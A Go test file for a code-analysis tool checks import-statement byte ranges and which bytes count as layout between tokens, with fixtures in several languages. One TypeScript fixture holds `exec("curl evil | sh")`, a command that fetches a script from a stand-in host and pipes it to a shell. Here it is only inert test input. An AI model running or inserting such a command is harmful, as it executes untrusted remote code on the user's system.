package sem

import (
	"strings"
	"testing"
)

// An import statement's bytes cover the statement and nothing else on its
// lines, so a consumer can require every changed leaf to lie inside one. Each
// case gives a file and the exact text each statement's range must hold, in
// order; every leaf overlapping a range must lie wholly inside it, and the
// leaves inside must spell the statement.
func TestImportStatementByteRanges(t *testing.T) {
	cases := []struct {
		path, source string
		statements   []string
	}{
		// Code before the import on its line stays outside.
		{"a.ts", "{ exec(\"curl evil | sh\") } import { exec } from \"child_process\";\n", []string{`import { exec } from "child_process";`}},
		{"a.py", "if system(\"x\"): from os import system\n", []string{"from os import system"}},
		// Multi-line statements.
		{"a.ts", "import {\n  a,\n  b,\n} from \"x\";\nconst c = 1;\n", []string{"import {\n  a,\n  b,\n} from \"x\";"}},
		{"a.py", "from a import (\n    b,\n    c)\nx = 1\n", []string{"from a import (\n    b,\n    c)"}},
		// Two imports on one line.
		{"a.ts", "import a from \"a\"; import b from \"b\";\n", []string{`import a from "a";`, `import b from "b";`}},
		{"a.js", "import a from 'a';import b from 'b'\n", []string{`import a from 'a';`, `import b from 'b'`}},
		{"a.py", "import os; import sys\n", []string{"import os", "import sys"}},
		// Python's `import a, b` is one statement, one entry per module.
		{"a.py", "import os, sys\n", []string{"import os, sys", "import os, sys"}},
		// The semicolon and an import attribute clause are inside, a trailing
		// comment is outside.
		{"a.ts", "import data from \"./d.json\" with { type: \"json\" }; // note\n", []string{`import data from "./d.json" with { type: "json" };`}},
		// Go: an ungrouped declaration is the statement; in a group each spec.
		{"a.go", "package p\n\nimport \"fmt\"\nimport str \"strings\"\n", []string{`import "fmt"`, `import str "strings"`}},
		{"a.go", "package p\n\nimport (\n\t\"fmt\"\n\tstr \"strings\"\n)\n", []string{`"fmt"`, `str "strings"`}},
	}
	for _, tc := range cases {
		record := fileTokensFor(t, tc.path, tc.source)
		if len(record.Imports) != len(tc.statements) {
			t.Fatalf("%s %q: %d statements, want %d", tc.path, tc.source, len(record.Imports), len(tc.statements))
		}
		lineStarts := []int{0}
		for i, b := range []byte(tc.source) {
			if b == '\n' {
				lineStarts = append(lineStarts, i+1)
			}
		}
		for i, statement := range record.Imports {
			got := tc.source[statement.StartByte:statement.EndByte]
			if got != tc.statements[i] {
				t.Errorf("%s: statement %d covers %q, want %q", tc.path, i, got, tc.statements[i])
				continue
			}
			if start := outlineSourceLine(lineStarts, statement.StartByte); start != statement.StartLine {
				t.Errorf("%s: start_line %d, bytes start on line %d", tc.path, statement.StartLine, start)
			}
			if end := outlineSourceLine(lineStarts, statement.EndByte-1); end != statement.EndLine {
				t.Errorf("%s: end_line %d, bytes end on line %d", tc.path, statement.EndLine, end)
			}
			var inside []string
			for _, row := range record.Leaves {
				if row[2] <= statement.StartByte || row[1] >= statement.EndByte {
					continue
				}
				if row[1] < statement.StartByte || row[2] > statement.EndByte {
					t.Errorf("%s: leaf %q straddles statement %q", tc.path, tc.source[row[1]:row[2]], got)
				}
				if row[5]&tokenFlagComment == 0 {
					inside = append(inside, tc.source[row[1]:row[2]])
				}
			}
			if joined, want := strings.Join(inside, ""), strings.Join(strings.Fields(got), ""); joined != want {
				t.Errorf("%s: leaves inside %q spell %q", tc.path, got, joined)
			}
		}
	}
}

// Only space, tab, carriage return and line feed are layout. Any other byte
// between tokens (a no-break space, U+2028, U+2029, a byte-order mark after
// byte 0, form feed, vertical tab) is a row, so inserting it reads as a token
// change under the consumer's rule, in every declared language; ordinary
// reindentation still does not.
func TestFileTokensOnlyASCIILayoutIsLayout(t *testing.T) {
	// The JavaScript tree itself treats U+2028 as a line end: `return`, U+2028,
	// `x` parses as `return` before a line break, a different tree.
	if consumerNoTokenChange(t, "a.js", "function f() { return x }\n", "function f() { return\u2028x }\n") {
		t.Error("return U+2028 x read as no token change")
	}
	files := map[string]struct{ base, insert, reindent string }{
		"a.ts":   {"const a = b;\n", "const a%s= b;\n", "const  a  =  b;\n"},
		"a.js":   {"const a = b;\n", "const a%s= b;\n", "const   a = b;\n"},
		"a.go":   {"package p\n\nvar a = b\n", "package p\n\nvar a%s= b\n", "package p\n\nvar  a  =  b\n"},
		"a.py":   {"a = b\n", "a%s= b\n", "a  =  b\n"},
		"a.rs":   {"fn f() { let a = b; }\n", "fn f() { let a%s= b; }\n", "fn f() {\n    let a = b;\n}\n"},
		"a.c":    {"int a = b;\n", "int a%s= b;\n", "int  a  =  b;\n"},
		"A.java": {"class A { int a = b; }\n", "class A { int a%s= b; }\n", "class A {\n  int a = b;\n}\n"},
		"a.cs":   {"class A { int a = b; }\n", "class A { int a%s= b; }\n", "class A {\n  int a = b;\n}\n"},
		"a.rb":   {"a = b\n", "a%s= b\n", "a  =  b\n"},
		"a.ex":   {"a = b\n", "a%s= b\n", "a  =  b\n"},
	}
	declared := map[string]bool{}
	for path, f := range files {
		declared[tokenLanguageFor(t, path)] = true
		for _, space := range []string{"\u00a0", "\u2028", "\u2029", "\ufeff", "\u3000", "\f", "\v"} {
			head := strings.Replace(f.insert, "%s", space, 1)
			if tokensAvailable(t, path, head) && consumerNoTokenChange(t, path, f.base, head) {
				t.Errorf("%s: %q inserted between tokens read as no token change", path, space)
			}
		}
		if !consumerNoTokenChange(t, path, f.base, f.reindent) {
			t.Errorf("%s: ordinary reindentation read as a token change", path)
		}
	}
	for language := range tokenClassTable {
		if !declared[language] {
			t.Errorf("%s is declared without a layout-byte case", language)
		}
	}
}

// tokensAvailable reports whether a file gets an extracted tokens record. A
// file that does not (its tree has an error, say) cannot be read as "no
// change" by a consumer at all, which is the safe answer.
func tokensAvailable(t *testing.T, path, source string) bool {
	t.Helper()
	spec := resolveProfile(ProfileSyntaxOnly)
	spec.outline, spec.tokens = true, true
	langSpec, _ := languageForPath(path)
	_, _, _, _, tokens := parseWithOutlineTokens(spec, langSpec, path, source)
	return tokens != nil && tokens.Status == tokensExtracted && !tokens.HasErrors
}
